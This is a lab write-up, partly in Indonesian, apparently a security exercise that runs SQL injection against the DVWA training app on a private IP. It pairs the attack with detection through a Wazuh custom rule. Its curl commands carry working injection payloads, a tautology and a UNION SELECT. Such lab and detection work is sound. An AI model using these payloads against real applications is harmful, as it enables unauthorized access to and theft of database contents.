# SQL Injection Attack

## Deskripsi
SQL Injection adalah serangan yang menyisipkan query SQL berbahaya
ke dalam input aplikasi untuk memanipulasi database.

## MITRE ATT&CK
- Tactic: Initial Access
- Technique: T1190 — Exploit Public-Facing Application

## Target
- URL: `http://192.168.217.130/DVWA/vulnerabilities/sqli/`
- Parameter: `id`
- Security Level: Low

## Attack Commands

### Step 1: Setup Session

```bash
SESS="PHPSESSID=MY_SESSION; security=low"
```

![Step 1 - Setup Session](Screenshot 2026-04-10 120522.png)

---

### Step 2: Basic SQL Injection

```bash
curl -s "http://192.168.217.130/DVWA/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" \
  -b "$SESS"
```

![Step 2 - Basic SQL Injection](Screenshot_2026-04-10_11_44_09.png)

---

### Step 3: UNION Based SQL Injection

```bash
curl -s "http://192.168.217.130/DVWA/vulnerabilities/sqli/?id=1+union+select+1,2--&Submit=Submit" \
  -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
```

![Step 3 - UNION Based](Screenshot 2026-04-10 120914.png)

## Detection
- Tool: Wazuh Custom Rules
- Rule ID: 100011
- Level: 10 (High)
- Log Source: Nginx access.log (JSON format)

## Evidence
Lihat folder `screenshots/` untuk bukti serangan dan deteksi.
